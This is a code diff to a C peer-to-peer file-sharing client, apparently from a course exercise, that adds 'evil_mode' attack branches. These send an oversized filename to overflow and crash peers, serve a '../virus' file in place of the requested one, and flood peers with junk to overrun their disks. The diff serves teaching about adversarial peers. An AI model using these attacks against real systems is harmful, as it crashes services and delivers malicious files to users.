@@ -527,7 +527,24 @@ static void task_download(task_t *t, task_t *tracker_task)
 		error("* Cannot connect to peer: %s\n", strerror(errno));
 		goto try_again;
 	}
-	osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
+	//Exercise 3: Making dowload file name exceed the buffer, causing seg fault and crahsing the peer
+	if(!evil_mode)
+	{
+		osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
+	}
+	else if(evil_mode == 3)
+	{
+		char* errorFileName=malloc(sizeof(char)*(FILENAMESIZ*32));
+		int i=0;
+		while(i<FILENAMESIZ*32-1)
+		{
+			errorFileName[i]='j';
+			i++;
+		}
+		errorFileName[(FILENAMESIZ*32)-1]='\0';
+		osp2p_writef(t->peer_fd, "GET %s OSP2P\n", errorFileName);
+		message("* Filename overflow attack successful.");
+	}
 
 	// Open disk file for the result.
 	// If the filename already exists, save the file in a name like
@@ -683,21 +700,25 @@ static void task_upload(task_t *t)
 		error("* Peer cannot serve files outside the current directory");
 		goto exit;
 	}
+	//Exercise 3: Set upload to different file than intended this file can be a virus
+	if(!evil_mode)
+		t->disk_fd = open(t->filename, O_RDONLY);
+	else if(evil_mode == 1)
+		t->disk_fd = open("../virus", O_RDONLY);
 
-	t->disk_fd = open(t->filename, O_RDONLY);
 	if (t->disk_fd == -1) {
 		error("* Cannot open file %s", t->filename);
 		goto exit;
 	}
 
+	message("* Transferring file %s\n", t->filename);
+	//Exercise 3: Causing disk overrun by infinitely writting and eventually overflowing the buffer.
 	if (evil_mode == 2)
 	{
 		while(osp2p_writef(t->peer_fd, "Jas&Joy") != TBUF_ERROR);
 		error("* Disk overrun (evil_mode 2 successful)\n");
 		goto exit;
 	}
-
-	message("* Transferring file %s\n", t->filename);
 	// Now, read file from disk and write it to the requesting peer.
 	while (1) {
 		int ret = write_from_taskbuf(t->peer_fd, t);
